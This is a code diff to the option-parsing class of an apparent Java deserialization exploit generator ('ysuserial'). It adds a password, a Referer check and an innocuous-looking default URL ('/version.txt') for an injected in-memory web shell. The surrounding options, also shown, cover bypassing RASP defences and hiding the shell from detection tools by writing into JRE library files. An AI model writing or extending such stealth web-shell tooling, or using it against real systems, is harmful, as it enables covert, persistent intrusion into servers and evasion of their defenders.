@@ -13,6 +13,7 @@ import org.su18.ysuserial.payloads.config.Config;
 import org.su18.ysuserial.payloads.util.dirty.DirtyDataWrapper;
 
 import static org.su18.ysuserial.payloads.config.Config.*;
+import static org.su18.ysuserial.payloads.util.HexUtils.generatePassword;
 
 public class GeneratePayload {
 
@@ -32,7 +33,9 @@ public class GeneratePayload {
 		options.addOption("dl", "dirty-length", true, "Length of dirty data when using type 1 or 3/Counts of Nesting loops when using type 2");
 		options.addOption("o", "obscure", false, "Using reflection to bypass RASP");
 		options.addOption("i", "inherit", false, "Make payload inherit AbstractTranslet or not");
-		options.addOption("u", "url", true, "MemoryShell binding url pattern,default [/su18]");
+		options.addOption("u", "url", true, "MemoryShell binding url pattern,default [/version.txt]");
+		options.addOption("pw", "password", true, "MemoryShell password,default [p@ssw0rd]");
+		options.addOption("r", "referer", true, "MemoryShell Referer check,default [https://su18.org/]");
 		options.addOption("h", "hide-mem-shell", false, "Hide memory shell from detection tools by writing file to $JAVA_HOME,only support SpringControllerMS currently");
 		options.addOption("ht", "hide-type", true, "Hide memory shell,type 1:write /jre/lib/charsets.jar 2:write /jre/classes/");
 		options.addOption("j", "jboss", false, "Using JBoss ObjectInputStream/ObjectOutputStream");
@@ -70,6 +73,14 @@ public class GeneratePayload {
 				url = "/" + url;
 			}
 			URL_PATTERN = url;
+		}
+
+		if (cmdLine.hasOption("password")) {
+			PASSWORD = generatePassword(cmdLine.getOptionValue("password"));
+		}
+
+		if (cmdLine.hasOption("referer")) {
+			REFERER = cmdLine.getOptionValue("referer");
 		}
 
 		if (cmdLine.hasOption("hide-mem-shell")) {
